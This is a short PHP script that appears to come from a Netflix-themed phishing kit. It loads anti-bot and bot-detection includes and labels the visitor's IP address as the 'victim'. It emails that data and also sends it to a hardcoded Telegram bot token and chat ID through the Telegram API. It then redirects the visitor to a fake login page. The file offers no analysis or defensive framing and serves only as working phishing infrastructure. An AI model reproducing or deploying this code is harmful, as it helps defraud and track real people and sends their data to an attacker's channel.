<?php
    
	require './systems/antibot.php';
	require './systems/detector.php';
	require './systems/index.php';



$ip = $_SERVER['REMOTE_ADDR'];





$message .= "-------------NETFLIX-------------\n";
$message .= "IP VICTIME :    $ip \n";
$message .= "---------------------------------------";

mail($email,$subject,$message);


file_get_contents("https://api.telegram.org/bot5621907662:AAHSGgNSgFdutQ4_VLYuEnKt3IX8N3NqohI/sendMessage?chat_id=-809211768&text=" . urlencode($message)."" );
    header('Location: login');
?>

